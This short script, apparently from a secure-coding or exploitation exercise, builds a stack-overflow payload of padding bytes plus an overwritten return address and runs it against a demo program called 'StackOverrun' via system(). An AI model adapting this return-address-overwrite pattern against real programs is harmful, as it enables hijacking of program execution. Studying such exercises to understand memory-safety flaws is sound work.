$arg = "ABCDEFGHIJKLMNOP"."\x90\x11\x40";
$cmd = "StackOverrun ".$arg;

system($cmd);

